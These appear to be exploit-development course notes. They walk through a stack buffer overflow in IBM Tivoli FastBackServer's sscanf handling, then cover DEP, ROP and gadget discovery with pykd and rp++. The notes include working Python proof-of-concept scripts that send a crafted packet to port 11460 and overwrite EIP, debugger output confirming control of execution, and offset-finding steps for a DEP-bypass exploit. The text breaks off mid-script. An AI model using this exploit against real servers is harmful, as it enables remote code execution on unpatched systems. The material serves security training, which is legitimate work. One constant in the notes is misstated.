The `source` buffer is the 1st `psCommandBuffer` and the format string specifier is the highlighted ASCII string.

Identify how the format string specifier is interpreted by going through each "%" sign in the ASCII string.

1. `%s`: the source buffer must contain a null-terminated string. This string will be copied into the address supplied in the 3rd argument.

2. `%d` specifier: we read a decimal integer after the null-terminated string and copy it into the address supplied by the 4th argument, and so forth.

If a vulnerability is present, we'll find it in the copy of the null-terminated string because **no size parameter is supplied** in the call to `sscanf` and no validation is performed on the input.

There is also no way of knowing beforehand how large the destination buffer supplied by the 3rd argument must be.

We can supply a network packet up to `0x4400` bytes in size, consisting of a `psCommandBuffer` up to `0x43CC` bytes.

If the destination buffer is smaller than this, we can overflow it and write beyond it. If the destination buffer is on the stack at a lower address than a return address, we can leverage it to gain control of EIP.

The destination buffer `0dafe204` is within the upper and lower bounds of the stack:

`dd esp L7`

```
0dafdbc0  0db53b30 0085b0dc 0dafe204 0dafe310
0dafdbd0  0dafdffc 0dafe308 0dafe30c
```

`!teb`

```
TEB at 0035d000
    ExceptionList:        0db5ff38
    StackBase:            0db60000
    StackLimit:           0dafd000
    SubSystemTib:         00000000
...
```

Find the distance from the destination buffer to a return address and determine if it < `0x43CC` bytes:

`k`

```
 # ChildEBP RetAddr  
00 0dafe314 00572e57 FastBackServer!FXCLI_SetConfFileChunk+0x40
01 0db5fe98 0056a21f FastBackServer!FXCLI_OraBR_Exec_Command+0x69a1
02 0db5feb4 00581366 FastBackServer!FXCLI_C_ReceiveCommand+0x130
03 0db5fef0 0048ca98 FastBackServer!FX_AGENT_Cyclic+0x116
04 0db5ff48 006693e9 FastBackServer!ORABR_Thread+0xef
05 0db5ff80 76449564 FastBackServer!_beginthreadex+0xf4
06 0db5ff94 772d293c KERNEL32!BaseThreadInitThunk+0x24
07 0db5ffdc 772d2910 ntdll!__RtlUserThreadStart+0x2b
08 0db5ffec 00000000 ntdll!_RtlUserThreadStart+0x1b
```

`dds 0dafe314 L2`

```
0dafe314  0db5fe98
0dafe318  00572e57 FastBackServer!FXCLI_OraBR_Exec_Command+0x69a1
```

`? 0dafe318 - 0dafe204`

```
Evaluate expression: 276 = 00000114
```

The distance from the destination buffer to the 1st return address is only `0x114` bytes. We can easily craft a packet that will overflow its limits.

The source buffer must be crafted according to the `sscanf` format string, which the API uses to parse each value. The first portion of the `psCommandBuffer` buffer must contain a very large ASCII string after the `File:` marker.

Draft a simple PoC using a length of `0x200`. We can ignore the second and third `psCommandBuffers`:

```python
import socket
import sys
from struct import pack

# psAgentCommand
buf = bytearray([0x41]*0xC)
buf += pack("<i", 0x534)  # opcode
buf += pack("<i", 0x0)    # 1st memcpy: offset
buf += pack("<i", 0x200)  # 1st memcpy: size field
buf += pack("<i", 0x0)    # 2nd memcpy: offset
buf += pack("<i", 0x100)  # 2nd memcpy: size field
buf += pack("<i", 0x0)    # 3rd memcpy: offset
buf += pack("<i", 0x100)  # 3rd memcpy: size field
buf += bytearray([0x41]*0x8)

# psCommandBuffer
formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (b"A"*0x200,0,0,0,0)
buf += formatString

# Checksum
buf = pack(">i", len(buf)-4) + buf
...
```

The format string buffer is created through the `%` Python format string operator.

The **checksum** value must match the length of the packet, so it is dynamically calculated at the end.

Remove the existing breakpoints, set a new one on the call to `sscanf`, and then execute our PoC:

`bc`

`bp FastBackServer!FXCLI_SetConfFileChunk+0x40`

`g`

```
Breakpoint 0 hit
FastBackServer!FXCLI_SetConfFileChunk+0x40:
00578d4b e8d5e70e00      call    FastBackServer!sscanf (00667525)
```

`dd esp L7`

```
0d79dbc0  0d7f3b30 0085b0dc 0d79e204 0d79e310
0d79dbd0  0d79dffc 0d79e308 0d79e30c
```

`da 0d7f3b30`

```
0d7f3b30  "File: AAAAAAAAAAAAAAAAAAAAAAAAAA"
0d7f3b50  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0d7f3b70  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0d7f3b90  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0d7f3bb0  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0d7f3bd0  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0d7f3bf0  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0d7f3c10  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0d7f3c30  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0d7f3c50  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0d7f3c70  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0d7f3c90  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
```

The format string correctly set up with a very long ASCII string following the `File:` marker.

Analyze the call stack before and after the call to `sscanf` to check if we can successfully overwrite the return address on the stack:

`k L4`

```
 # ChildEBP RetAddr  
00 0d79e314 00572e57 FastBackServer!FXCLI_SetConfFileChunk+0x40
01 0d7ffe98 0056a21f FastBackServer!FXCLI_OraBR_Exec_Command+0x69a1
02 0d7ffeb4 00581366 FastBackServer!FXCLI_C_ReceiveCommand+0x130
03 0d7ffef0 0048ca98 FastBackServer!FX_AGENT_Cyclic+0x116
```

`p`

```
eax=00000001
FastBackServer!FXCLI_SetConfFileChunk+0x45:
00578d50 83c41c          add     esp,1Ch
```

`k`

```
 # ChildEBP RetAddr  
00 0d79e314 41414141 FastBackServer!FXCLI_SetConfFileChunk+0x45
WARNING: Frame IP not in any known module. Following frames may be wrong.
01 0d79e318 41414141 0x41414141
02 0d79e31c 41414141 0x41414141
03 0d79e320 41414141 0x41414141
04 0d79e324 41414141 0x41414141
05 0d79e328 41414141 0x41414141
06 0d79e32c 41414141 0x41414141
...
```

The return address has been overwritten.

Let execution continue and exit the current function to gain control of `EIP`:

`g`

```
(1ab0.1320): Access violation - code c0000005 (first chance)
41414141 ??              ???
```

We reverse engineered opcode `0x534` and found a bug that will likely lead to RCE.

Since this is only one of many possible opcodes, several other vulnerabilities may exist in this application.

## Extra Mile

### FastBackServer

Modify the PoC to use a different opcode and locate another vulnerability in the FastBackServer application.

### Faronics Deep Freeze Enterprise Server

Install an evaluation edition of Faronics Deep Freeze Enterprise Server from `C:\Installers\Faronics`. Anything can be entered as the customization code.

Once the application is installed, use `TCPView` to locate listening ports for the `DFServerService.exe` application.

Locate some of the multiple vulnerabilities in this application, including denial of service, memory corruption, and logical bugs. There are more than 15 vulnerabilities to find!

Create a PoC script to trigger at least one of the memory corruption vulnerabilities.

Note: The` DFServerService.exe` executable is packed with a `UPX` packer. IDA Pro is not able to parse it.

Either use the `PE.Explorer_setup.exe` installer present in `C:\Installers\UPX` to install unpacking software, or use the already unpacked executable `DFServerServiceUnpacked.exe` also located in the `C:\Installers\UPX` folder.

# Stack Overflows and DEP Bypass

Microsoft introduced DEP in Windows XP Service Pack 2 and Windows Server 2003 Service Pack 1 to prevent code execution from a non-executable memory region (e.g. the stack)

On compatible CPUs, DEP sets the non-executable (`NX`) bit that distinguishes between code and data areas in memory.

At a global level, the OS can be configured through the `/NoExecute` option in `boot.ini` (Windows XP) or through `bcdedit.exe`, (from Windows Vista and above) to run in one of 4 modes:

-	`OptIn`: DEP is enabled for system processes and custom-defined applications only.
-	`OptOut`: DEP is enabled for everything except specifically exempt applications.
-	`AlwaysOn`: DEP is permanently enabled.
-	`AlwaysOff`: DEP is permanently disabled.

DEP can be enabled or disabled on a **per-process basis at execution time**.

`LdrpCheckNXCompatibility`, resides in `ntdll.dll`, performs various checks to determine whether or not `NX` support should be enabled for the process.

> A call to `NtSetInformationProcess` (within `ntdll.dll`) is issued to **enable or disable DEP** for the running process.

Default setting:

- Windows client OS like Windows 7 and Windows 10, have `OptIn`

- Windows server editions like Windows Server 2012 or Windows Server 2019 have `AlwaysOn`.

Open Notepad and attach WinDbg to it > display the memory protections of a given address.

`!vprot eip`

```
BaseAddress:       77901000
AllocationBase:    77870000
AllocationProtect: 00000080  PAGE_EXECUTE_WRITECOPY
RegionSize:        00087000
State:             00001000  MEM_COMMIT
Protect:           00000020  PAGE_EXECUTE_READ
Type:              01000000  MEM_IMAGE
```

`PAGE_EXECUTE_READ` => it is both executable and readable.

`!vprot esp`

```
BaseAddress:       0101f000
AllocationBase:    00fe0000
AllocationProtect: 00000004  PAGE_READWRITE
RegionSize:        00001000
State:             00001000  MEM_COMMIT
Protect:           00000004  PAGE_READWRITE
Type:              00020000  MEM_PRIVATE
```

The memory address is only writable and readable.

These memory protections must be enforced by the CPU through DEP to have any effect.

To check if DEP is enabled, we can use the Narly WinDbg extension and  dump enabled mitigations.

`.load narly`

`!nmod`

```
01030000 0106f000 notepad  /SafeSEH ON  /GS *ASLR *DEP C:\Windows\system32\notepad.exe
...
```

Narly detects the security features by parsing the `PE header`.

The SafeSEH, ASLR, and DEP memory protections are enabled.

Verify DEP by writing a dummy shellcode of 4 `NOPs` on the stack and then copying the current stack address into EIP and single step over the first NOP:

`ed esp 90909090`

`r eip = esp`

`r`

```
0101f7c8 90              nop
```

`p`

```
(1d60.120c): Access violation - code c0000005 (first chance)
0101f7c8 90              nop
```

The execution is blocked and the OS throws an access violation.

## Windows Defender Exploit Guard

Windows Defender Exploit Guard allow us to enforce DEP for the Tivoli FastBack server.

Use Narly to determine if DEP is enabled:

`!nmod`

```
...
00400000 00c0c000 FastBackServer       /SafeSEH OFF                C:\Program Files\Tivoli\TSM\FastBack\server\FastBackServer.exe
...
```

DEP is not enabled.

To enable DEP, either modify the OS settings and set DEP to `AlwaysOn`, or use another security feature.

`Enhanced Mitigation Experience Toolkit (EMET)` software package allows an administrator to enforce different mitigations even if the application was compiled without them.

With EMET, it is possible to enable DEP for the FastBack server process without affecting other parts of the OS.

Microsoft deprecated EMET with the release of the `Windows 10 Fall Creators Update`.

From that version of Windows 10 and forward, EMET was renamed to `Windows Defender Exploit Guard (WDEG)`.

EMET and WDEG also provide additional mitigations. (out of scope)

Use WDEG to enable DEP for the FastBack server:

1. Open `Windows Defender Security Center` > open `App & browser control`, scroll to the bottom > click on `Exploit protection` settings. This opens the main WDEG window.
 
2. Choose the `Program settings` tab, click `Add program to customize`, and select `Choose exact file path`

3. Navigate to `C:\Program Files\Tivoli\TSM\FastBack\server` and select `FastBackServer.exe` > scroll down to `Data Execution Prevention (DEP)` and enable it by ticking the `Override system settings` box.
 
4. Restart the FastBackServer service to have the changes take effect.

Narly would still not report that DEP is enabled because Narly only presents information parsed from the executable.

Test the presence of DEP again:

`ed esp 90909090`

`r eip = esp`

`p`

```
(7a8.1310): Access violation - code c0000005 (first chance)
0b93ff54 90              nop
```

## Return Oriented Programming

The 1st techniques to bypass DEP were developed on Linux and called return-to-libc (`ret2libc`).

Once Windows introduced DEP, the Return Oriented Programming (`ROP`) method was developed.

Exploit developers first abused the fact that **DEP can be disabled on a per-process basis**:

- Invoke the `NtSetInformationProcess` API
- Replace the `JMP ESP` assembly instruction with the memory address of `NtSetInformationProcess`.
- Place the required arguments on the stack as part of the overwrite.
- Once the `NtSetInformationProcess` API finishes, jump to our shellcode again.

To mitigate the bypass through `NtSetInformationProcess`, Microsoft implemented `Permanent DEP`:

- From Vista SP1 and XP SP3 onward, any executable linked with the `/NXCOMPAT` flag during compilation is automatically set as `OptIn`.

- This ensures that DEP can't be disabled for the entire runtime duration of the process.

- This method has the same effect as the `AlwaysOn` system policy, but on a per-process basis.

Other attack variations:

- Uses the `WinExec` function to execute commands on the vulnerable system (not as effective as having arbitrary shellcode execution).

- Directly calling the new `SetProcessDEPPolicy` API (from the application itself yields the same results).

=> The only option is to circumvent the OS `NX` checks.

`ROP` technique:

- Allows a `ret2libc` attack to be mounted on x86/x64 executables without calling any functions.

- Instead of returning to the beginning of a function and simulating a call, we can return to any instruction sequence in the executable memory pages that **ends with a `return`**.

- ASLR can impact and limit this technique.

By combining a large number of short instruction sequences, we can build gadgets that allow arbitrary computation and perform higher-level actions, such as writing content to a memory location.

Because of the **variable length** of assembly instructions on the x86 architecture, returning into the middle of existing opcodes can lead to different instructions:

`u 004c10ee L2`

```
FastBackServer!std::_Allocate+0x1e:
004c10ee 5d              pop     ebp
004c10ef c3              ret
```

`u 004c10ee - 1 L2`

```
FastBackServer!std::_Allocate+0x1d:
004c10ed 045d            add     al,5Dh
004c10ef c3              ret
```

This is not true for all architectures. E.g., the **ARM** architecture has **fixed-length instructions**.

The number of obtainable gadgets depends on the Windows version and the vulnerable application:

2 different approaches we could take:

1.	Build a 100% ROP shellcode. (complicated)

2.	Build a ROP stage that can lead to subsequent execution of traditional shellcode.

A goal of the ROP stage could be to allocate a chunk of memory with write and execute permissions and then copy shellcode to it.

One way to implement this ROP attack is to allocate memory using the Win32 `VirtualAlloc` API.

A different approach to bypass DEP could be to change the permissions of the memory page where the shellcode already resides by calling the Win32 `VirtualProtect` API.

The address of `VirtualProtect` or `VirtualAlloc` is usually retrieved from the Import Address Table (`IAT`) of the target DLL. Then the **required API parameters** can be set on the **stack** before the relevant APIs are invoked.

Often, it's not possible to predict argument values before triggering the exploit => use ROP itself to solve this problem as well.

In the buffer that triggers the vulnerability, create a skeleton of the function call and then use ROP gadgets to dynamically set the parameters on the stack.

As another alternative to bypass DEP, use the Win32 `WriteProcessMemory` API. The idea is to hot-patch the code section (the `.text` section) of a running process, inject shellcode, and then eventually jump into it.

`WriteProcessMemory` is able to patch executable memory through a call to `NtProtectVirtualMemory`.

## Gadget Selection

To locate the gadgets that are needed to invoke the APIs.

We leveraged the WinDbg `search` command to obtain the address of an instruction like `JMP ESP`.

Locate the addresses of all the possible gadgets we can obtain.

2 different methods:

1. Requires the use of Python along with the `Pykd` WinDbg extension.

2. Another pre-built tool called `RP++`.

We will omit discussing `Mona` because it does not support Python3 or 64-bit.

### Debugger Automation: Pykd

Pykd is a Python-based WinDbg extension with numerous APIs to help automate debugging and crash dump analysis.

Pykd modules can either be used as standalone scripts or loaded as a WinDbg extension.

Using `pykd` will allow us to automate the gadget search.

Use the `dprintln` method to print a string to the console.

```python
from pykd import *
dprintln("Hello World!")
```

To run this pykd script, 1st attach WinDbg to the `FastBackServer` process and load `pykd` through the `.load` command.

Then use the `!py` extension command to use Python and supply the name and path of the script as an argument.

`.load pykd`

`!py C:\Tools\pykd\HelloWorld.py`

```
Hello World!
```

If the script has a standard ".py" extension, the extension can be omitted when running it in WinDbg.

Building our ROP finder script.

The pykd script must locate gadgets inside code pages of an `EXE` or `DLL` with the **execute permission set**.

1. Accept the name of the module as a parameter and locate it in memory.

2. For the selected module, locate all **memory pages** that are executable.

3. For each of these memory pages, locate the memory address of all the `RET` assembly instructions and store them in a list.

4. Pick the first one, subtract 1 byte from it, and disassemble the opcodes to check if they are valid assembly instructions. If they are, we have found a possible ROP gadget.

5. This process will continue, by subtracting another byte and rechecking. The maximum number of bytes to subtract depends on the **length of ROP gadgets** we want.

Typically, it is not beneficial to search for very long ROP gadgets because they will eventually contain instructions that are not useful, such as calls and jumps.

Obtain a reference to the module where we want to locate gadgets.

Use the pykd `module` class to create a Python object that represents a loaded `DLL` or `EXE`:

```python
from pykd import *

if __name__ == '__main__':
 count = 0
 try:
     modname = sys.argv[1].strip()
 except IndexError:
     print("Syntax: findrop.py modulename")
     sys.exit()

 mod = module(modname)
```

Find the number of memory pages inside of it.

On the x86 architecture, every memory page is `0x1000` bytes, and the `module` object contains the properties `begin` and `end`, which returns the start and end address of the allocated memory for the module.

```python
from pykd import *

PAGE_SIZE = 0x1000

if __name__ == '__main__':
 count = 0
 try:
     modname = sys.argv[1].strip()
 except IndexError:
     print("Syntax: findrop.py modulename")
     sys.exit()

 mod = module(modname)

 if mod:
    pn = int((mod.end() - mod.begin()) / PAGE_SIZE)
    print("Total Memory Pages: %d" % pn)
```

`!py C:\Tools\pykd\findrop`

```
Syntax: findrop.py modulename
```

`!py C:\Tools\pykd\findrop FastBackServer`

```
Total Memory Pages: 2060
```

Although we have found a large number of memory pages, many of them will not be executable.

Parse each of them and locate the ones that are **executable**.

The pykd `getVaProtect` method will return the memory protection constant enum value for a given address.

 4 constant enum value that represent executable pages are:

1. `PAGE_EXECUTE` (`0x10`)

2. `PAGE_EXECUTE_READ` (`0x20`)

3. `PAGE_EXECUTE_READWRITE` (`0x20`)

4. `PAGE_EXECUTE_WRITECOPY` (`0x80`)


Loop over each memory page, invoke `getVaProtect` on the 1st address of the page, and check if the result is equal to one of the 4 values above.

```python
from pykd import *

PAGE_SIZE = 0x1000

MEM_ACCESS_EXE = {
0x10  : "PAGE_EXECUTE"                                                     ,
0x20  : "PAGE_EXECUTE_READ"                                                ,
0x40  : "PAGE_EXECUTE_READWRITE"                                           ,
0x80  : "PAGE_EXECUTE_WRITECOPY"                                           ,
}

def isPageExec(address):
 try:
     protect = getVaProtect(address)
 except:
     protect = 0x1
 if protect in MEM_ACCESS_EXE.keys():
     return True
 else:
     return False

if __name__ == '__main__':
 count = 0
 try:
     modname = sys.argv[1].strip()
 except IndexError:
     print("Syntax: findrop.py modulename")
     sys.exit()

 mod = module(modname)
 pages = []

 if mod:
    pn = int((mod.end() - mod.begin()) / PAGE_SIZE)
    print("Total Memory Pages: %d" % pn)
    
    for i in range(0, pn):
     page = mod.begin() + i*PAGE_SIZE
     if isPageExec(page):
         pages.append(page)
    print("Executable Memory Pages: %d" % len(pages))
```

Executing the script will print the number of executable pages while storing the address of each of them in an array.

`!py C:\Tools\pykd\findrop FastBackServer`

```
Total Memory Pages: 2060
Executable Memory Pages: 637
```

Search each of them for `return` instructions.

Overall goal is to search backward from all of the `return` instructions to detect possible gadgets.

2 types of `return` instructions.

1. Regular `RET` instruction, which pops the address at the top of the stack into EIP and increases ESP by 4.

2. `RET 0xXX`, where the address at the top of the stack is popped into EIP, and ESP is increased by `0xXX` bytes.

The normal return instruction has the opcode value `0xC3`, whereas the return with an offset has an opcode of `0xC2`, followed by the number of bytes in the offset.

=> If we search all bytes on a page to check if they are `0xC3` or `0xC2`, we will find all return instructions.

Iterates over each byte for every executable page and tests for the return opcodes.

Set up an empty array `retn` to hold all the return instruction addresses.

```python
def findRetn(pages):
 retn = []
 for page in pages:
     ptr = page
     while ptr < (page + PAGE_SIZE):
         b = loadSignBytes(ptr, 1)[0] & 0xff
         if b not in [0xc3, 0xc2]:
             ptr += 1
             continue
         else:
             retn.append(ptr)
             ptr += 1
             
 print("Found %d ret instructions" % len(retn))
 return retn
```

Iterate over all the executable pages we located.

For each of these entries, perform a while loop that will go through each byte in the given page, pointed by the `ptr` variable.

The pykd `loadSignBytes` API is used to read the byte at the given memory address, pointed to by `ptr`.

The API returns signed bytes and through a bitwise AND operation ("&") we obtain the unsigned value.

The byte is then compared to the 2 return instruction opcode values.

If a return instruction is found, the address is added to the retn array.

At the end of the function, the number of return instructions found is printed, and the populated array is returned.

`!py C:\Tools\pykd\findrop FastBackServer`

```
Total Memory Pages: 2060
Executable Memory Pages: 637
Found 13155 ret instructions
```

Discover all the available gadgets by:

- Iterate over each return instruction and subtract 1 byte, then attempt to disassemble the resulting instructions.

- Subtract 2 bytes and disassemble the resulting instructions.

- Repeat this process until we reach the maximum gadget size we want.

Since not all binary values correspond to valid opcodes, we will encounter many invalid instructions, and our code needs to detect and handle this scenario.

If a gadget contains an instruction that will alter the execution flow, such as a `jump` or a `call`, we must **filter** them out as well.

Assembly language contains several privileged instructions, which a regular application cannot execute. => remove these also.

Use the `disasm` class to disassemble a CPU instruction at any given memory address. Then, invoke the `instruction` method on the instantiated `disasm` object to obtain the given instruction.

Find and print a single instruction by subtracting one byte from the first return instruction.

```python
def getGadgets(addr):
  ptr = addr - 1
  dasm = disasm(ptr)
  gadget_size = dasm.length()
  print("Gadget size is: %x" % gadget_size)
  instr = dasm.instruction()
  print("Found instruction: %s" % instr)
```

The address of the return instruction passed to `getGadgets` is decremented by 1 byte and assigned to `ptr`.

With the object created, call the `length` method to get the size of the current gadget and print it.

`!py C:\Tools\pykd\findrop FastBackServer`

```
Total Memory Pages: 2060
Executable Memory Pages: 637
Found 13155 ret instructions
Gadget size is: 1
Found instruction: 00401015 5d              pop     ebp
```

We have located the hexadecimal value of `0x5D`, just before the return instruction.

The output states that this value equates to the instruction `POP EBP`.

The address `0x401015` will give us access to the gadget "POP EBP; RETN". We can use it since it contains valid instructions, none of which are privileged.

Scale up this process with multiple tasks, the first of which is to subtract more than one byte.

In our script, we are going to set the default gadget length value to `8`, but also allow the user to input a custom value.

Second, we must create a list of privileged instructions along with the WinDbg interpretation of an invalid instruction, which is given as "???".

List of privileged instructions along with the representation of an invalid instruction (Avoid any gadgets with any of these instructions as they would cause an access violation while executing.)

```python
BAD = ["clts", "hlt", "lmsw", "ltr", "lgdt", "lidt" ,"lldt", "mov cr", "mov dr",
    "mov tr", "in ", "ins", "invlpg", "invd", "out", "outs", "cli", "sti"
    "popf", "pushf", "int", "iret", "iretd", "swapgs", "wbinvd", "???"]
```

List of bad assembly instructions to contain any execution flow instructions, like a call or a jump.

```python
BAD = ["clts", "hlt", "lmsw", "ltr", "lgdt", "lidt" ,"lldt", "mov cr", "mov dr",
    "mov tr", "in ", "ins", "invlpg", "invd", "out", "outs", "cli", "sti"
    "popf", "pushf", "int", "iret", "iretd", "swapgs", "wbinvd", "call",
    "jmp", "leave", "ja", "jb", "jc", "je", "jr", "jg", "jl", "jn", "jo",
    "jp", "js", "jz", "lock", "enter", "wait", "???"]
```

In some advanced cases, we might want to make use of a gadget containing a conditional jump instruction or a call. If we craft the stack layout appropriately, we can make use of these gadgets without disrupting the execution flow, but typically, it is best to avoid them altogether unless strictly required by specific conditions.

Since the output of the instruction method will be presented as a readable ASCII string like "POP EBP", we can use our generated list of bad instructions together with Python's any12 method. Its usage in an if statement:

```python
if any(bad in instr for bad in BAD):
  break
```

The `instr` variable will contain the output of the instruction method. Here we will compare all the elements of the instr variable with all elements in the array of bad instructions called BAD. If any of them are equal, the any function will return true, triggering the break instruction and allowing us to skip to the next ptr address.

The code also verifies that the series of instructions ends with a ret instruction, to ensure that it is indeed a usable gadget.

The final part involves combining all the previous steps along with some code that outputs the results to a file, which we can search through later. Since this is not a Python course, we are going to omit a detailed description of these steps. The complete script is located in C:\Tools\pykd\findropfull.py.

When the script is executed, it will save the gadgets in C:\tools\pykd\findrop_output.txt, where we can use a text editor to search through it.

First, let's execute the complete script and allow it to generate the file, as shown in Listing 22.

`!py C:\Tools\pykd\findrop FastBackServer`

```
###############################################################
# findrop.py pykd Gadget Discovery module #
###############################################################
[+] Total Memory Pages: 2060
[+] Executable Memory Pages: 637
[+] Found 13155 ret instructions
[+] Gadget discovery started...
[+] Gadget discovery ended (13 secs).
[+] Found 30368 gadgets in FastBackServer.
```

The script found more than 30000 gadgets in the executable. Many of these are identical since our code does not check for duplicates.

If we open up the generated `findrop_output.txt` file, we find each gadget printed nicely along with its address in the first column:

```
...
--------------------------------------------------------------------------------------

00401015 5d              pop     ebp

00401016 c3              ret

--------------------------------------------------------------------------------------

00401013 8be5            mov     esp,ebp

00401015 5d              pop     ebp

00401016 c3              ret

--------------------------------------------------------------------------------------
...
```

Listing 23 - Contents of generate findrop_output.txt file
The code developed here is by no means optimized. Even the output is not the best for searching; however, it allows us to understand the basics of how to find gadgets.
In the next section, we are going to cover another automated solution that will provide faster processing speed and better output for searching.

### Optimized Gadget Discovery: RP++

In this section, we are going to introduce a different automated tool to find ROP gadgets. This tool will greatly increase our speed, compared to other scripts.

The rp++1 tool is a series of open-source applications written in C++ and provides support for both 32-bit and 64-bit CPUs. Additionally, the various compiled executables can run on Windows, Linux, and macOS and can locate gadgets in Windows PE files, Linux ELF files,2 and macOS Mach-O files.3

Besides supporting a wide array of operating systems, rp++ does not run inside the debugger, but rather works directly on the file system. This provides a massive speed increase and is one of the reasons we prefer it.

While rp++ is open-source, the source code is too large to walk through here and requires a strong working knowledge of C++ programming.
rp++ follows the same principles of locating ROP gadgets as shown in our pykd script. The 32-bit version of rp++ is located in the C:\tools\dep directory on the student VM.

First, we copy the FastBackServer.exe executable to the C:\tools\dep folder, then we can invoke rp-win-x86.exe. We must first supply the file to be processed with the -f option and the maximum gadget length with the -r parameter.

In this case, the maximum gadget length is the number of assembly instructions in the ROP gadget, not the actual number of bytes, unlike in the pykd script.

```bat
cd C:\Tools\dep
copy "C:\Program Files\Tivoli\TSM\FastBack\server\FastBackServer.exe" .

rp-win-x86.exe -f FastBackServer.exe -r 5 > rop.txt
```
        
We picked a maximum gadget length of `5`. Anything longer typically contains instructions that might be problematic during the execution of our ROP chain. We also redirected the output to a file, since it's written to the console by default.

Once the execution completes, we can open the output file and inspect the syntax of the located gadgets.

```
Trying to open 'FastBackServer.exe'..
Loading PE information..
FileFormat: PE, Arch: Ia32
Using the Nasm syntax..

Wait a few seconds, rp++ is looking for gadgets..
in .text
211283 found.

A total of 211283 gadgets found.
0x00547b94: aaa  ; adc dword [eax], eax ; add esp, 0x08 ; mov ecx, dword [ebp-0x00000328] ; mov dword [ecx+0x00000208], 0x00000C04 ; call dword [0x0067E494] ;  (1 found)
0x00569725: aaa  ; add byte [eax], al ; add byte [ebx+0x0BC0E8C8], cl ; or eax, 0x5DE58B00 ; ret  ;  (1 found)
0x005417b2: aaa  ; add byte [eax], al ; call dword [0x0067E494] ;  (1 found)
0x00541b78: aaa  ; add byte [eax], al ; call dword [0x0067E494] ;  (1 found)
0x0054e2e0: aaa  ; add dword [eax], 0x81E8558B ; retn 0x0210 ;  (1 found)
...
```

Each gadget is listed on a separate line. The first column is its memory address followed by a ":" and a space, after which we find the first instruction.

Additional instructions are separated by ";".

This syntax makes it possible to search in the text editor or use a command-line tool like `findstr`, depending on our preference.

E.g., Perform a search for ": pop eax ; ret". This ensures that the POP EAX instruction is first and nothing comes between it and the `RET` instruction.

## Bypassing DEP

Return to a vulnerability in the IBM Tivoli Storage Manager FastBack Server component that we discovered through reverse engineering in a previous module and create an exploit that uses ROP to bypass DEP.

This vulnerability was found by sending a network packet containing the opcode value `0x534` to TCP port `11460`. This forces the execution of a code path that calls `sscanf` with a user-controlled buffer as an argument.

Setting the `File` parameter of the format string used in the `sscanf` call to a very large string causes a stack buffer overflow and, in the end, yields control of the `EIP` register.

The proof of concept to trigger this vulnerability is shown below.

```python
import socket
import sys
from struct import pack

# psAgentCommand
buf = bytearray([0x41]*0xC)
buf += pack("<i", 0x534)  # opcode
buf += pack("<i", 0x0)    # 1st memcpy: offset
buf += pack("<i", 0x500)  # 1st memcpy: size field
buf += pack("<i", 0x0)    # 2nd memcpy: offset
buf += pack("<i", 0x100)  # 2nd memcpy: size field
buf += pack("<i", 0x0)    # 3rd memcpy: offset
buf += pack("<i", 0x100)  # 3rd memcpy: size field
buf += bytearray([0x41]*0x8)

# psCommandBuffer
formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (b"A"*0x200,0,0,0,0)
buf += formatString

# Checksum
buf = pack(">i", len(buf)-4) + buf

def main():
	if len(sys.argv) != 2:
		print("Usage: %s <ip_address>\n" % (sys.argv[0]))
		sys.exit(1)
	
	server = sys.argv[1]
	port = 11460

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((server, port))

	s.send(buf)
	s.close()

	print("[+] Packet sent")
	sys.exit(0)


if __name__ == "__main__":
 	main()
```

Creating a ROP chain that calls the Windows `VirtualAlloc` API.

### Getting The Offset

The first thing we need to do is locate the offset of the DWORD inside our input buffer that is loaded into `EIP`, just like with any other stack buffer overflow exploit. We need to do similar work for ESP as well.

We are going to use the Metasploit pattern_create and pattern_offset scripts to locate the offset. First, we generate the 0x200 byte length pattern string:

```bash
msf-pattern_create -l 0x200
```

Update the proof of concept

```python
import socket
import sys
from struct import pack

# psAgentCommand
buf = bytearray([0x41]*0xC)
buf += pack("<i", 0x534)  # opcode
buf += pack("<i", 0x0)    # 1st memcpy: offset
buf += pack("<i", 0x500)  # 1st memcpy: size field
buf += pack("<i", 0x0)    # 2nd memcpy: offset
buf += pack("<i", 0x100)  # 2nd memcpy: size field
buf += pack("<i", 0x0)    # 3rd memcpy: offset
buf += pack("<i", 0x100)  # 3rd memcpy: size field
buf += bytearray([0x41]*0x8)

# psCommandBuffer
pattern = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac...

formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (pattern,0,0,0,0)
buf += formatString

# Checksum
buf = pack(">i", len(buf)-4) + buf
...
```

Execute the updated proof of concept and observe the access violation:

```
(830.b2c): Access violation - code c0000005 (first chance)
41326a41 ??              ???
```

EIP contains the value `41326a41`, so we use `msf-pattern_offset` to determine the offset:

```bash
msf-pattern_offset -q 41326a41
```

This shows us that the offset is `276`. Similarly, we can dump the first DWORD ESP points to, and use msf-pattern_offset to find the offset of 280. This means that ESP points right after the return address and we do not need additional padding space between the return address and our payload.

Now, we can update the proof of concept to take the offsets into account as shown in Listing 31.

```python
import socket
import sys
from struct import pack

# psAgentCommand
buf = bytearray([0x41]*0xC)
buf += pack("<i", 0x534)  # opcode
buf += pack("<i", 0x0)    # 1st memcpy: offset
buf += pack("<i", 0x500)  # 1st memcpy: size field
buf += pack("<i", 0x0)    # 2nd memcpy: offset
buf += pack("<i", 0x100)  # 2nd memcpy: size field
buf += pack("<i", 0x0)    # 3rd memcpy: offset
buf += pack("<i", 0x100)  # 3rd memcpy: size field
buf += bytearray([0x41]*0x8)

# psCommandBuffer
offset = b"A" * 276
eip = b"B" * 4
rop = b"C" * (0x400 - 276 - 4)

